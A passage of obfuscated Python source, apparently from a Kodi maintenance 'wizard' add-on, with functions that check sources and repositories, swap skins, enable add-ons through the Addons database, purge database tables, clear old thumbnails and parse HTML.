                        log ("Removing Source %s"%O00000OOOOOOO00O0 ,5 )#line:3039
                    else :log ("Source %s was not removed"%O00000OOOOOOO00O0 ,5 )#line:3040
            if len (O00OOO0OOOOOO0OO0 )>0 :#line:3041
                for O00000OOOOOOO00O0 ,O0O0OO0OO00000OO0 ,O00O0OO0O000O0O00 ,OO0OO000OOO000O00 in O00OOO0OOOOOO0OO0 :#line:3042
                    O0OOOOOOO0OO000OO =O0OOOOOOO0OO000OO .replace ('\n        <source>\n            <name>%s</name>\n            <path pathversion="1">%s</path>\n            <allowsharing>%s</allowsharing>\n        </source>'%(O00000OOOOOOO00O0 ,O0O0OO0OO00000OO0 ,O00O0OO0O000O0O00 ),'')#line:3043
                    log ("Removing Source %s"%O00000OOOOOOO00O0 ,5 )#line:3044
                OO000O00O0O0OOO00 =open (SOURCES ,mode ='w')#line:3046
                OO000O00O0O0OOO00 .write (str (O0OOOOOOO0OO000OO ))#line:3047
                OO000O00O0O0OOO00 .close ()#line:3048
                OO00O0OOOOOO00OO0 =len (OO0000O0O0O000OOO )-len (O0O0O000OOOOO0O0O )#line:3049
                OOO0O00000O0O0O0O =len (O0O0O000OOOOO0O0O )-len (O00OOO0OOOOOO0OO0 )#line:3050
                O00000000O000OOO0 =len (O00OOO0OOOOOO0OO0 )#line:3051
                DIALOG .ok (ADDONTITLE ,"[COLOR %s]Checking sources for broken paths has been completed"%COLOR2 ,"Working: [COLOR %s]%s[/COLOR] | Kept: [COLOR %s]%s[/COLOR] | Removed: [COLOR %s]%s[/COLOR][/COLOR]"%(COLOR2 ,COLOR1 ,OO00O0OOOOOO00OO0 ,COLOR1 ,OOO0O00000O0O0O0O ,COLOR1 ,O00000000O000OOO0 ))#line:3052
            else :log ("No Bad Sources to be removed.",5 )#line:3053
        else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]All Sources Are Working[/COLOR]"%COLOR2 )#line:3054
    else :log ("No Sources Found",5 )#line:3055
def checkRepos ():#line:3057
    DP .create (ADDONTITLE ,'[COLOR %s]Checking Repositories...[/COLOR]'%COLOR2 )#line:3058
    O00OO00O0O0OOO0O0 =[]#line:3059
    ebi ('UpdateAddonRepos')#line:3060
    O000O0OO0O0O0O0O0 =glob .glob (os .path .join (ADDONS ,'repo*'))#line:3061
    if len (O000O0OO0O0O0O0O0 )==0 :#line:3062
        DP .close ()#line:3063
        LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Repositories Found![/COLOR]"%COLOR2 )#line:3064
        return #line:3065
    O000OO0000OOO0OOO =len (O000O0OO0O0O0O0O0 );OO0OOOOOOOO0OOOO0 =0 ;#line:3066
    while OO0OOOOOOOO0OOOO0 <O000OO0000OOO0OOO :#line:3067
        OO0OOOOOOOO0OOOO0 +=1 #line:3068
        if DP .iscanceled ():break #line:3069
        OO0000OOO00OOOOOO =int (percentage (OO0OOOOOOOO0OOOO0 ,O000OO0000OOO0OOO ))#line:3070
        DP .update (OO0000OOO00OOOOOO ,'','[COLOR %s]Checking: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O000O0OO0O0O0O0O0 [OO0OOOOOOOO0OOOO0 -1 ].replace (ADDONS ,'')[1 :]))#line:3071
        xbmc .sleep (1000 )#line:3072
    if DP .iscanceled ():#line:3073
        DP .close ()#line:3074
        LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled[/COLOR]"%COLOR2 )#line:3075
        sys .exit ()#line:3076
    DP .close ()#line:3077
    O0O000O000O00O00O =Grab_Log (False )#line:3078
    O0OO000O0O00O0OO0 =re .compile ('CRepositoryUpdateJob(.+?)failed').findall (O0O000O000O00O00O )#line:3079
    for O00O0OOOOOOOO0000 in O0OO000O0O00O0OO0 :#line:3080
        log ("Bad Repository: %s "%O00O0OOOOOOOO0000 ,5 )#line:3081
        O000000OO0O0O0O00 =O00O0OOOOOOOO0000 .replace ('[','').replace (']','').replace (' ','').replace ('/','').replace ('\\','')#line:3082
        if not O000000OO0O0O0O00 in O00OO00O0O0OOO0O0 :#line:3083
            O00OO00O0O0OOO0O0 .append (O000000OO0O0O0O00 )#line:3084
    if len (O00OO00O0O0OOO0O0 )>0 :#line:3085
        OO0OOOOO0O0O00O0O ="[COLOR %s]Below is a list of Repositories that did not resolve.  This does not mean that they are Depreciated, sometimes hosts go down for a short period of time.  Please do serveral scans of your repository list before removing a repository just to make sure it is broken.[/COLOR][CR][CR][COLOR %s]"%(COLOR2 ,COLOR1 )#line:3086
        OO0OOOOO0O0O00O0O +='[CR]'.join (O00OO00O0O0OOO0O0 )#line:3087
        OO0OOOOO0O0O00O0O +='[/COLOR]'#line:3088
        TextBox ("%s: Bad Repositories"%ADDONTITLE ,OO0OOOOO0O0O00O0O )#line:3089
    else :#line:3090
        LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]All Repositories Working![/COLOR]"%COLOR2 )#line:3091
def killxbmc (over =None ):#line:3097
        log ("Force Closing Kodi: Platform[%s]"%str (platform_d ()),5 )#line:3098
        os ._exit (1 )#line:3099
def redoThumbs ():#line:3101
    if not os .path .exists (THUMBS ):os .makedirs (THUMBS )#line:3102
    OO0O0O00O0OOO0O0O ='0123456789abcdef'#line:3103
    OOOOOO0O0OOO000O0 =os .path .join (THUMBS ,'Video','Bookmarks')#line:3104
    for OOO0OOOO0O0OO00OO in OO0O0O00O0OOO0O0O :#line:3105
        OO0OO00OO00O00O00 =os .path .join (THUMBS ,OOO0OOOO0O0OO00OO )#line:3106
        if not os .path .exists (OO0OO00OO00O00O00 ):os .makedirs (OO0OO00OO00O00O00 )#line:3107
    if not os .path .exists (OOOOOO0O0OOO000O0 ):os .makedirs (OOOOOO0O0OOO000O0 )#line:3108
def reloadFix (default =None ):#line:3110
    DIALOG .ok (ADDONTITLE ,"[COLOR %s]WARNING: Sometimes Reloading the Profile causes Kodi to crash.  While Kodi is Reloading the Profile Please Do Not Press Any Buttons![/COLOR]"%COLOR2 )#line:3111
    if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3112
    if default ==None :#line:3113
        lookandFeelData ('save')#line:3114
    redoThumbs ()#line:3115
    ebi ('ActivateWindow(Home)')#line:3116
    xbmc .sleep (10000 )#line:3118
    if KODIV >=17 :kodi17Fix ()#line:3119
    if default ==None :#line:3120
        log ("Switching to: %s"%getS ('defaultskin'))#line:3121
        OOO0OO000O0OOO00O =getS ('defaultskin')#line:3122
        skinSwitch .swapSkins (OOO0OO000O0OOO00O )#line:3123
        O00OO00OOO0OOO00O =0 #line:3124
        while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O00OO00OOO0OOO00O <150 :#line:3125
            O00OO00OOO0OOO00O +=1 #line:3126
            xbmc .sleep (200 )#line:3127
        if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:3128
            ebi ('SendClick(11)')#line:3129
        lookandFeelData ('restore')#line:3130
    addonUpdates ('reset')#line:3131
    forceUpdate ()#line:3132
    ebi ("ReloadSkin()")#line:3133
def skinToDefault ():#line:3135
    if not currSkin ()in ['skin.confluence','skin.myconfluence','skin.estuary']:#line:3136
        O0OOO0OO00000O0O0 ='skin.confluence'if KODIV <17 else 'skin.estuary'#line:3137
    swapSkins (O0OOO0OO00000O0O0 )#line:3138
def swapSkins (OOOO00OO00O00OO0O ):#line:3140
    skinSwitch .swapSkins (OOOO00OO00O00OO0O )#line:3141
    O00O0000OOO0O00OO =0 #line:3142
    xbmc .sleep (1000 )#line:3143
    while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O00O0000OOO0O00OO <150 :#line:3144
        O00O0000OOO0O00OO +=1 #line:3145
        xbmc .sleep (100 )#line:3146
        ebi ('SendAction(Select)')#line:3147
    if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:3149
        ebi ('SendClick(11)')#line:3150
    else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Fresh Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return False #line:3151
    xbmc .sleep (500 )#line:3152
def mediaCenter ():#line:3154
    if str (HOME ).lower ().find ('kodi'):#line:3155
        return 'Kodi'#line:3156
    elif str (HOME ).lower ().find ('spmc'):#line:3157
        return 'SPMC'#line:3158
    else :#line:3159
        return 'Unknown Fork'#line:3160
def kodi17Fix ():#line:3162
    O00O00O000O00O000 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3163
    O0OO0OO000OO0O000 =[]#line:3164
    for O00O00O00OOOO0000 in sorted (O00O00O000O00O000 ,key =lambda O0OO000O000OOO0O0 :O0OO000O000OOO0O0 ):#line:3165
        O0OOO0OOO00O0OOO0 =os .path .join (O00O00O00OOOO0000 ,'addon.xml')#line:3166
        if os .path .exists (O0OOO0OOO00O0OOO0 ):#line:3167
            O00000O000OOO0OOO =O00O00O00OOOO0000 .replace (ADDONS ,'')[1 :-1 ]#line:3168
            try :#line:3169
                OOOO00OO00O000O0O =open (O0OOO0OOO00O0OOO0 )#line:3170
                OOOOO00OOOO00000O =OOOO00OO00O000O0O .read ()#line:3171
                O00O0OO0OOO0OO000 =parseDOM (OOOOO00OOOO00000O ,'addon',ret ='id')#line:3172
                OOOO00OO00O000O0O .close ()#line:3173
            except :#line:3174
                OOOO00OO00O000O0O =open (O0OOO0OOO00O0OOO0 ,encoding ='utf-8')#line:3175
                OOOOO00OOOO00000O =OOOO00OO00O000O0O .read ()#line:3176
                O00O0OO0OOO0OO000 =parseDOM (OOOOO00OOOO00000O ,'addon',ret ='id')#line:3177
                OOOO00OO00O000O0O .close ()#line:3178
            try :#line:3179
                O0OO00OO0O0O00OOO =xbmcaddon .Addon (id =O00O0OO0OOO0OO000 [0 ])#line:3180
            except :#line:3181
                try :#line:3182
                    O0OO0OO000OO0O000 .append (O00O0OO0OOO0OO000 [0 ])#line:3184
                except :#line:3185
                    try :#line:3186
                        O0OO0OO000OO0O000 .append (O00000O000OOO0OOO )#line:3188
                    except :#line:3189
                        if len (O00O0OO0OOO0OO000 )==0 :log ("Unabled to enable: %s(Cannot Determine Addon ID)"%O00000O000OOO0OOO ,5 )#line:3190
                        else :log ("Unabled to enable: %s"%O00O00O00OOOO0000 ,5 )#line:3191
    if len (O0OO0OO000OO0O000 )>0 :#line:3192
        O0O0O0O000OO00OO0 =0 #line:3193
        if not BUILDNAME =="":#line:3194
            DP .create (ADDONTITLE ,'[COLOR %s]מעדכן הרחבות'%COLOR2 +'\n'+''+'\n'+'אנא המתן[/COLOR]')#line:3196
            for O0OOOOOO0O0O0O0OO in O0OO0OO000OO0O000 :#line:3198
                if 'service.xbmc.versioncheck'in O0OOOOOO0O0O0O0OO :#line:3199
                   continue #line:3200
                if 'metadata.themoviedb.org.python'in O0OOOOOO0O0O0O0OO :#line:3201
                   continue #line:3202
                if 'metadata.tvshows.themoviedb.org.python'in O0OOOOOO0O0O0O0OO :#line:3203
                   continue #line:3204
                if 'game.controller.default'in O0OOOOOO0O0O0O0OO :#line:3205
                   continue #line:3206
                if 'game.controller.snes'in O0OOOOOO0O0O0O0OO :#line:3207
                   continue #line:3208
                if 'metadata.album.universal'in O0OOOOOO0O0O0O0OO :#line:3209
                   continue #line:3210
                if 'metadata.artists.universal'in O0OOOOOO0O0O0O0OO :#line:3211
                   continue #line:3212
                if 'metadata.common.imdb.com'in O0OOOOOO0O0O0O0OO :#line:3213
                   continue #line:3214
                if 'metadata.common.themoviedb.org'in O0OOOOOO0O0O0O0OO :#line:3215
                   continue #line:3216
                if 'metadata.tvshows.themoviedb.org'in O0OOOOOO0O0O0O0OO :#line:3217
                   continue #line:3218
                O0O0O0O000OO00OO0 +=1 #line:3219
                O00OO000OO0OO0000 =int (percentage (O0O0O0O000OO00OO0 ,len (O0OO0OO000OO0O000 )))#line:3220
                try :#line:3221
                   DP .update (O00OO000OO0OO0000 ,"","Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OOOOOO0O0O0O0OO ))#line:3222
                except :#line:3223
                   DP .update (O00OO000OO0OO0000 ,"Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OOOOOO0O0O0O0OO ))#line:3224
                addonDatabase (O0OOOOOO0O0O0O0OO ,1 )#line:3225
                if DP .iscanceled ():break #line:3226
            if DP .iscanceled ():#line:3227
                DP .close ()#line:3228
                LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled![/COLOR]"%COLOR2 )#line:3229
                sys .exit ()#line:3230
            DP .close ()#line:3231
        else :#line:3232
          for O0OOOOOO0O0O0O0OO in O0OO0OO000OO0O000 :#line:3233
            if 'service.xbmc.versioncheck'in O0OOOOOO0O0O0O0OO :#line:3234
               continue #line:3235
            if 'metadata.themoviedb.org.python'in O0OOOOOO0O0O0O0OO :#line:3236
               continue #line:3237
            if 'metadata.tvshows.themoviedb.org.python'in O0OOOOOO0O0O0O0OO :#line:3238
               continue #line:3239
            if 'game.controller.default'in O0OOOOOO0O0O0O0OO :#line:3240
               continue #line:3241
            if 'game.controller.snes'in O0OOOOOO0O0O0O0OO :#line:3242
               continue #line:3243
            if 'metadata.album.universal'in O0OOOOOO0O0O0O0OO :#line:3244
               continue #line:3245
            if 'metadata.artists.universal'in O0OOOOOO0O0O0O0OO :#line:3246
               continue #line:3247
            if 'metadata.common.imdb.com'in O0OOOOOO0O0O0O0OO :#line:3248
               continue #line:3249
            if 'metadata.common.themoviedb.org'in O0OOOOOO0O0O0O0OO :#line:3250
               continue #line:3251
            if 'metadata.tvshows.themoviedb.org'in O0OOOOOO0O0O0O0OO :#line:3252
               continue #line:3253
            addonDatabase (O0OOOOOO0O0O0O0OO ,1 )#line:3255
    forceUpdate ()#line:3256
def addonDatabase (addon =None ,state =1 ):#line:3259
    O00000OO0O0O0OO0O =latestDB ('Addons')#line:3260
    O00000OO0O0O0OO0O =os .path .join (DATABASE ,O00000OO0O0O0OO0O )#line:3261
    OOO00O000OO0O000O =str (datetime .now ())[:-7 ]#line:3262
    if os .path .exists (O00000OO0O0O0OO0O ):#line:3263
        try :#line:3264
            O000OO0000OOO0O00 =database .connect (O00000OO0O0O0OO0O )#line:3265
            OOOO0000O0O00O00O =O000OO0000OOO0O00 .cursor ()#line:3266
        except Exception as O0O000O00O00O0OOO :#line:3267
            log ("DB Connection Error: %s"%str (O0O000O00O00O0OOO ),5 )#line:3268
            return False #line:3269
    else :return False #line:3270
    if state ==2 :#line:3271
        try :#line:3272
            OOOO0000O0O00O00O .execute ("DELETE FROM installed WHERE addonID = ?",(addon ,))#line:3273
            O000OO0000OOO0O00 .commit ()#line:3274
            OOOO0000O0O00O00O .close ()#line:3275
        except Exception as O0O000O00O00O0OOO :#line:3276
            log ("Error Removing %s from DB"%addon )#line:3277
        return True #line:3278
    try :#line:3279
        OOOO0000O0O00O00O .execute ("SELECT id, addonID, enabled FROM installed WHERE addonID = ?",(addon ,))#line:3280
        OO0OO000O0OO00O00 =OOOO0000O0O00O00O .fetchone ()#line:3281
        if OO0OO000O0OO00O00 ==None :#line:3282
            OOOO0000O0O00O00O .execute ('INSERT INTO installed (addonID , enabled, installDate) VALUES (?,?,?)',(addon ,state ,OOO00O000OO0O000O ,))#line:3283
            log ("Insert %s into db"%addon )#line:3284
        else :#line:3285
            O00O0O0OO000000O0 ,OOOO00O000OO00000 ,OOO00O000O0OOOO00 =OO0OO000O0OO00O00 #line:3286
            OOOO0000O0O00O00O .execute ('UPDATE installed SET enabled = ? WHERE id = ? ',(state ,O00O0O0OO000000O0 ,))#line:3287
            log ("Updated %s in db"%addon )#line:3288
        O000OO0000OOO0O00 .commit ()#line:3289
        OOOO0000O0O00O00O .close ()#line:3290
    except Exception as O0O000O00O00O0OOO :#line:3291
        log ("Erroring enabling addon: %s"%addon )#line:3292
def purgeDb (O0O00O0000O000OOO ):#line:3297
    log ('Purging DB %s.'%O0O00O0000O000OOO ,5 )#line:3301
    if os .path .exists (O0O00O0000O000OOO ):#line:3302
        try :#line:3303
            O00000000OO0O00O0 =database .connect (O0O00O0000O000OOO )#line:3304
            O0000OO0OOO00O00O =O00000000OO0O00O0 .cursor ()#line:3305
        except Exception as OO0O0O0OO00OOOO00 :#line:3306
            log ("DB Connection Error: %s"%str (OO0O0O0OO00OOOO00 ),5 )#line:3307
            return False #line:3308
    else :log ('%s not found.'%O0O00O0000O000OOO ,5 );return False #line:3309
    O0000OO0OOO00O00O .execute ("SELECT name FROM sqlite_master WHERE type = 'table'")#line:3310
    for O0OOOOOO00OO0O000 in O0000OO0OOO00O00O .fetchall ():#line:3311
        if O0OOOOOO00OO0O000 [0 ]=='version':#line:3312
            log ('Data from table `%s` skipped.'%O0OOOOOO00OO0O000 [0 ],5 )#line:3313
        else :#line:3314
            try :#line:3315
                O0000OO0OOO00O00O .execute ("DELETE FROM %s"%O0OOOOOO00OO0O000 [0 ])#line:3316
                O00000000OO0O00O0 .commit ()#line:3317
                log ('Data from table `%s` cleared.'%O0OOOOOO00OO0O000 [0 ],5 )#line:3318
            except Exception as OO0O0O0OO00OOOO00 :log ("DB Remove Table `%s` Error: %s"%(O0OOOOOO00OO0O000 [0 ],str (OO0O0O0OO00OOOO00 )),5 )#line:3319
    O0000OO0OOO00O00O .close ()#line:3320
    log ('%s DB Purging Complete.'%O0O00O0000O000OOO ,5 )#line:3321
    O00O000O00OOO0OO0 =O0O00O0000O000OOO .replace ('\\','/').split ('/')#line:3322
    LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]%s Complete[/COLOR]"%(COLOR2 ,O00O000O00OOO0OO0 [len (O00O000O00OOO0OO0 )-1 ]))#line:3323
def oldThumbs ():#line:3325
    OOOOOOOOOOO00OOOO =os .path .join (DATABASE ,latestDB ('Textures'))#line:3326
    O0O00O0OOOO0O0O00 =10 #line:3327
    OOO0O0OOOO0OOOO0O =TODAY -timedelta (days =7 )#line:3328
    O0OOO00OO0OO00O0O =[]#line:3329
    O0OOOO0O000OOOOOO =[]#line:3330
    O0OOOOO0OOOO0000O =0 #line:3331
    if os .path .exists (OOOOOOOOOOO00OOOO ):#line:3332
        try :#line:3333
            O00O0OO00O0O00OO0 =database .connect (OOOOOOOOOOO00OOOO )#line:3334
            OOO000OOO0O0OOOO0 =O00O0OO00O0O00OO0 .cursor ()#line:3335
        except Exception as O00O00OO0OOO000OO :#line:3336
            log ("DB Connection Error: %s"%str (O00O00OO0OOO000OO ),5 )#line:3337
            return False #line:3338
    else :log ('%s not found.'%OOOOOOOOOOO00OOOO ,5 );return False #line:3339
    OOO000OOO0O0OOOO0 .execute ("SELECT idtexture FROM sizes WHERE usecount < ? AND lastusetime < ?",(O0O00O0OOOO0O0O00 ,str (OOO0O0OOOO0OOOO0O )))#line:3340
    OO0O00OO00OOO00O0 =OOO000OOO0O0OOOO0 .fetchall ()#line:3341
    for O00O00OOOO000OOOO in OO0O00OO00OOO00O0 :#line:3342
        OO0OO0OOO0OOO0O00 =O00O00OOOO000OOOO [0 ]#line:3343
        O0OOO00OO0OO00O0O .append (OO0OO0OOO0OOO0O00 )#line:3344
        OOO000OOO0O0OOOO0 .execute ("SELECT cachedurl FROM texture WHERE id = ?",(OO0OO0OOO0OOO0O00 ,))#line:3345
        OOOOO000000OO0O0O =OOO000OOO0O0OOOO0 .fetchall ()#line:3346
        for OOO0O000O0OOOO0OO in OOOOO000000OO0O0O :#line:3347
            O0OOOO0O000OOOOOO .append (OOO0O000O0OOOO0OO [0 ])#line:3348
    log ("%s total thumbs cleaned up."%str (len (O0OOOO0O000OOOOOO )),5 )#line:3349
    for O0000OOOO0O000O00 in O0OOO00OO0OO00O0O :#line:3350
        OOO000OOO0O0OOOO0 .execute ("DELETE FROM sizes   WHERE idtexture = ?",(O0000OOOO0O000O00 ,))#line:3351
        OOO000OOO0O0OOOO0 .execute ("DELETE FROM texture WHERE id        = ?",(O0000OOOO0O000O00 ,))#line:3352
    OOO000OOO0O0OOOO0 .execute ("VACUUM")#line:3353
    O00O0OO00O0O00OO0 .commit ()#line:3354
    OOO000OOO0O0OOOO0 .close ()#line:3355
    for OOOO0OO0OOO000OOO in O0OOOO0O000OOOOOO :#line:3356
        OOO0OOOO00OOOOOOO =os .path .join (THUMBS ,OOOO0OO0OOO000OOO )#line:3357
        try :#line:3358
            O0OO0O000OOOO00O0 =os .path .getsize (OOO0OOOO00OOOOOOO )#line:3359
            os .remove (OOO0OOOO00OOOOOOO )#line:3360
            O0OOOOO0OOOO0000O +=O0OO0O000OOOO00O0 #line:3361
        except :#line:3362
            pass #line:3363
    OO00O00O0OOO00O00 =convertSize (O0OOOOO0OOOO0000O )#line:3364
    if len (O0OOOO0O000OOOOOO )>0 :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Clear Thumbs: %s Files / %s MB[/COLOR]!'%(COLOR2 ,str (len (O0OOOO0O000OOOOOO )),OO00O00O0OOO00O00 ))#line:3365
    else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Clear Thumbs: None Found![/COLOR]'%COLOR2 )#line:3366
def parseDOM (O0O00000000OO0OOO ,name =u"",attrs ={},ret =False ):#line:3368
    if isinstance (O0O00000000OO0OOO ,str ):#line:3371
        try :#line:3372
            O0O00000000OO0OOO =[O0O00000000OO0OOO .decode ("utf-8")]#line:3373
        except :#line:3374
            O0O00000000OO0OOO =[O0O00000000OO0OOO ]#line:3375
    elif isinstance (O0O00000000OO0OOO ,unicode ):#line:3376
        O0O00000000OO0OOO =[O0O00000000OO0OOO ]#line:3377
    elif not isinstance (O0O00000000OO0OOO ,list ):#line:3378
        return u""#line:3379
    if not name .strip ():#line:3381
        return u""#line:3382
    O0O0OOOO000000OO0 =[]#line:3384
    for O0OO0OO0OOOO0O0O0 in O0O00000000OO0OOO :#line:3385
        O00OO0OOOOO00O000 =re .compile ('(<[^>]*?\n[^>]*?>)').findall (O0OO0OO0OOOO0O0O0 )#line:3386
        for OO0O0O0OOO00OO0O0 in O00OO0OOOOO00O000 :#line:3387
            O0OO0OO0OOOO0O0O0 =O0OO0OO0OOOO0O0O0 .replace (OO0O0O0OOO00OO0O0 ,OO0O0O0OOO00OO0O0 .replace ("\n"," "))#line:3388
        O0OOO0O0O0OO00OO0 =[]#line:3390
        for OOO0OO00O0OO0OO00 in attrs :#line:3391
            OO0OOO000O00OO0O0 =re .compile ('(<'+name +'[^>]*?(?:'+OOO0OO00O0OO0OO00 +'=[\'"]'+attrs [OOO0OO00O0OO0OO00 ]+'[\'"].*?>))',re .M |re .S ).findall (O0OO0OO0OOOO0O0O0 )#line:3392
            if len (OO0OOO000O00OO0O0 )==0 and attrs [OOO0OO00O0OO0OO00 ].find (" ")==-1 :#line:3393
                OO0OOO000O00OO0O0 =re .compile ('(<'+name +'[^>]*?(?:'+OOO0OO00O0OO0OO00 +'='+attrs [OOO0OO00O0OO0OO00 ]+'.*?>))',re .M |re .S ).findall (O0OO0OO0OOOO0O0O0 )#line:3394
            if len (O0OOO0O0O0OO00OO0 )==0 :#line:3396
                O0OOO0O0O0OO00OO0 =OO0OOO000O00OO0O0 #line:3397
                OO0OOO000O00OO0O0 =[]#line:3398
            else :#line:3399
                OOO0000O000OOOO0O =range (len (O0OOO0O0O0OO00OO0 ))#line:3400
                OOO0000O000OOOO0O .reverse ()#line:3401
                for O000O00OO0000000O in OOO0000O000OOOO0O :#line:3402
                    if not O0OOO0O0O0OO00OO0 [O000O00OO0000000O ]in OO0OOO000O00OO0O0 :#line:3403
                        del (O0OOO0O0O0OO00OO0 [O000O00OO0000000O ])#line:3404
        if len (O0OOO0O0O0OO00OO0 )==0 and attrs =={}:#line:3406
            O0OOO0O0O0OO00OO0 =re .compile ('(<'+name +'>)',re .M |re .S ).findall (O0OO0OO0OOOO0O0O0 )#line:3407
            if len (O0OOO0O0O0OO00OO0 )==0 :#line:3408
                O0OOO0O0O0OO00OO0 =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (O0OO0OO0OOOO0O0O0 )#line:3409
        if isinstance (ret ,str ):#line:3411
            OO0OOO000O00OO0O0 =[]#line:3412
            for OO0O0O0OOO00OO0O0 in O0OOO0O0O0OO00OO0 :#line:3413
                OO000O0O0OO00OO0O =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (OO0O0O0OOO00OO0O0 )#line:3414
                if len (OO000O0O0OO00OO0O )==0 :#line:3415
                    OO000O0O0OO00OO0O =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (OO0O0O0OOO00OO0O0 )#line:3416
                for OOOOO000OOOOO0O00 in OO000O0O0OO00OO0O :#line:3417
                    O000OO0OOOOOO000O =OOOOO000OOOOO0O00 [0 ]#line:3418
                    if O000OO0OOOOOO000O in "'\"":#line:3419
                        if OOOOO000OOOOO0O00 .find ('='+O000OO0OOOOOO000O ,OOOOO000OOOOO0O00 .find (O000OO0OOOOOO000O ,1 ))>-1 :#line:3420
                            OOOOO000OOOOO0O00 =OOOOO000OOOOO0O00 [:OOOOO000OOOOO0O00 .find ('='+O000OO0OOOOOO000O ,OOOOO000OOOOO0O00 .find (O000OO0OOOOOO000O ,1 ))]#line:3421
                        if OOOOO000OOOOO0O00 .rfind (O000OO0OOOOOO000O ,1 )>-1 :#line:3423
                            OOOOO000OOOOO0O00 =OOOOO000OOOOO0O00 [1 :OOOOO000OOOOO0O00 .rfind (O000OO0OOOOOO000O )]#line:3424
                    else :#line:3425
                        if OOOOO000OOOOO0O00 .find (" ")>0 :#line:3426
                            OOOOO000OOOOO0O00 =OOOOO000OOOOO0O00 [:OOOOO000OOOOO0O00 .find (" ")]#line:3427
                        elif OOOOO000OOOOO0O00 .find ("/")>0 :#line:3428
                            OOOOO000OOOOO0O00 =OOOOO000OOOOO0O00 [:OOOOO000OOOOO0O00 .find ("/")]#line:3429
                        elif OOOOO000OOOOO0O00 .find (">")>0 :#line:3430
                            OOOOO000OOOOO0O00 =OOOOO000OOOOO0O00 [:OOOOO000OOOOO0O00 .find (">")]#line:3431
                    OO0OOO000O00OO0O0 .append (OOOOO000OOOOO0O00 .strip ())#line:3433
            O0OOO0O0O0OO00OO0 =OO0OOO000O00OO0O0 #line:3434
        else :#line:3435
            OO0OOO000O00OO0O0 =[]#line:3436
            for OO0O0O0OOO00OO0O0 in O0OOO0O0O0OO00OO0 :#line:3437
                OOO00O0OOOO00OO0O =u"</"+name #line:3438
                O00O000OOOOOO0O00 =O0OO0OO0OOOO0O0O0 .find (OO0O0O0OOO00OO0O0 )#line:3440
                OOO00OO0O00OO0000 =O0OO0OO0OOOO0O0O0 .find (OOO00O0OOOO00OO0O ,O00O000OOOOOO0O00 )#line:3441
                OO0OOOOOOO0O0O0O0 =O0OO0OO0OOOO0O0O0 .find ("<"+name ,O00O000OOOOOO0O00 +1 )#line:3442
                while OO0OOOOOOO0O0O0O0 <OOO00OO0O00OO0000 and OO0OOOOOOO0O0O0O0 !=-1 :#line:3444
                    OO0OOO00OOO000OO0 =O0OO0OO0OOOO0O0O0 .find (OOO00O0OOOO00OO0O ,OOO00OO0O00OO0000 +len (OOO00O0OOOO00OO0O ))#line:3445
                    if OO0OOO00OOO000OO0 !=-1 :#line:3446
                        OOO00OO0O00OO0000 =OO0OOO00OOO000OO0 #line:3447
                    OO0OOOOOOO0O0O0O0 =O0OO0OO0OOOO0O0O0 .find ("<"+name ,OO0OOOOOOO0O0O0O0 +1 )#line:3448
                if O00O000OOOOOO0O00 ==-1 and OOO00OO0O00OO0000 ==-1 :#line:3450
                    O00OO00O0O000OOOO =u""#line:3451
                elif O00O000OOOOOO0O00 >-1 and OOO00OO0O00OO0000 >-1 :#line:3452
                    O00OO00O0O000OOOO =O0OO0OO0OOOO0O0O0 [O00O000OOOOOO0O00 +len (OO0O0O0OOO00OO0O0 ):OOO00OO0O00OO0000 ]#line:3453
                elif OOO00OO0O00OO0000 >-1 :#line:3454
                    O00OO00O0O000OOOO =O0OO0OO0OOOO0O0O0 [:OOO00OO0O00OO0000 ]#line:3455
                elif O00O000OOOOOO0O00 >-1 :#line:3456
                    O00OO00O0O000OOOO =O0OO0OO0OOOO0O0O0 [O00O000OOOOOO0O00 +len (OO0O0O0OOO00OO0O0 ):]#line:3457
                if ret :#line:3459
                    OOO00O0OOOO00OO0O =O0OO0OO0OOOO0O0O0 [OOO00OO0O00OO0000 :O0OO0OO0OOOO0O0O0 .find (">",O0OO0OO0OOOO0O0O0 .find (OOO00O0OOOO00OO0O ))+1 ]#line:3460
                    O00OO00O0O000OOOO =OO0O0O0OOO00OO0O0 +O00OO00O0O000OOOO +OOO00O0OOOO00OO0O #line:3461
                O0OO0OO0OOOO0O0O0 =O0OO0OO0OOOO0O0O0 [O0OO0OO0OOOO0O0O0 .find (O00OO00O0O000OOOO ,O0OO0OO0OOOO0O0O0 .find (OO0O0O0OOO00OO0O0 ))+len (O00OO00O0O000OOOO ):]#line:3463
                OO0OOO000O00OO0O0 .append (O00OO00O0O000OOOO )#line:3464
            O0OOO0O0O0OO00OO0 =OO0OOO000O00OO0O0 #line:3465
        O0O0OOOO000000OO0 +=O0OOO0O0O0OO00OO0 #line:3466
    return O0O0OOOO000000OO0 #line:3468
def replaceHTMLCodes (O00OO00O00OO0O00O ):#line:3471
